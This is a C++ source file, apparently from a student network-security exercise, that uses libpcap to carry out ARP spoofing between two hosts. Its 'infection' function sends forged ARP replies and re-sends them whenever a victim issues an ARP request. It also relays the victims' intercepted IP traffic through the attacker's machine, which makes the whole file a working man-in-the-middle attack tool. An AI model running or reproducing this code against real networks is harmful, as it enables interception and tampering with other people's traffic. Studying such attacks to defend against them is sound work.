#include "arpManage.h"
#include "extraFunc.h"

arpManage::arpManage(){
    std::cout<<"arpManage Start"<<std::endl;
    handle = pcap_open_live("eth0",BUFSIZ,1,1,errbuf);
}
arpManage::~arpManage(){ }

uint8_t arpManage::sameCheck(uint8_t* source, uint8_t* destination){
    if(!memcmp(source, destination, 6)) return 1;
    else return 0;
}

void arpManage::infection(struct spoofingInfo ah){
    SetAddArp(ah.pkt,ah.sendermac1,ah.hostmac,ah.targetip1,ah.sendermac1,ah.senderip1);
    if(pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){
        printf("Packet send 1 error !!\n");
    }
    SetAddArp(ah.pkt,ah.sendermac2,ah.hostmac,ah.targetip2,ah.sendermac2,ah.senderip2);
    if(pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){
        printf("Packet send 2 error !!\n");
    }

    while(pcap_next_ex(handle, &header, &packet)){
        length=header->caplen;
        ep = reinterpret_cast<struct libnet_ethernet_hdr*>(const_cast<u_char*>(packet));
        ap = reinterpret_cast<struct arp_hdr*>(const_cast<u_char*>(packet) + sizeof(libnet_ethernet_hdr));
        ip = reinterpret_cast<struct libnet_ipv4_hdr*>(const_cast<u_char*>(packet) + sizeof(struct libnet_ethernet_hdr));

        if( ntohs(ep->ether_type) == ETHERTYPE_ARP && ntohs(ap->ar_op) == ARPOP_REQUEST){
            if( sameCheck(ep->ether_dhost, ah.broad_arr) && sameCheck(ep->ether_shost, ah.sendermac1) ){
                SetAddArp(ah.pkt,ah.sendermac1,ah.hostmac,ah.targetip1,ah.sendermac1,ah.senderip1);
                for(int i=0;i<3;i++){
                    res1=pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt));
                    if(res1 != 0) printf("Packet send error !!\n");
                }
            }// Sender1 broadcast
            else if( sameCheck(ep->ether_dhost, ah.broad_arr) && sameCheck(ep->ether_shost, ah.sendermac2) ){
                SetAddArp(ah.pkt,ah.sendermac2,ah.hostmac,ah.targetip2,ah.sendermac2,ah.senderip2);
                for(int i=0;i<3;i++){
                    res1=pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt));
                    if(res1 != 0) printf("Packet send error !!\n");
                }
            }// Sender2 broadcast
            else if(  sameCheck(ep->ether_dhost, ah.hostmac) && sameCheck(ep->ether_shost, ah.sendermac1) ){
                SetAddArp(ah.pkt,ah.sendermac1,ah.hostmac,ah.targetip1,ah.sendermac1,ah.senderip1);
                for(int i=0;i<3;i++){
                    res1=pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt));
                    if(res1 != 0) printf("Packet send error !!\n");
                }
            }//sender1 unicast
            else if( sameCheck(ep->ether_dhost, ah.hostmac) && sameCheck(ep->ether_shost, ah.sendermac2) ){
                SetAddArp(ah.pkt,ah.sendermac2,ah.hostmac,ah.targetip2,ah.sendermac2,ah.senderip2);
                for(int i=0;i<3;i++){
                    res1=pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt));
                    if(res1 != 0) printf("Packet send error !!\n");
                }
            }//sender2 unicast
        }
        else if( ntohs(ep->ether_type) == ETHERTYPE_IP){
            if( sameCheck(ep->ether_shost, ah.sendermac1) && sameCheck(ep->ether_dhost, ah.hostmac) ){
                memcpy(ep->ether_shost, ah.hostmac,6);
                memcpy(ep->ether_dhost, ah.targetmac1,6);
                std::cout << "Data Relay" << std::endl;
                memcpy(relayPacket,packet,length);
                if(pcap_sendpacket(handle, relayPacket, static_cast<int>(length))){
                    printf("Reply Packet send error 123 !!\n");
                }
            }
            else if( sameCheck(ep->ether_shost, ah.sendermac2) && sameCheck(ep->ether_dhost, ah.hostmac) ){
                memcpy(ep->ether_shost, ah.hostmac,6);
                memcpy(ep->ether_dhost, ah.targetmac2,6);
                memcpy(relayPacket,packet,length);
                if(pcap_sendpacket(handle, relayPacket, static_cast<int>(length))){
                    printf("Reply Packet send error 456 !!\n");
                }
            }
        }
    }
}
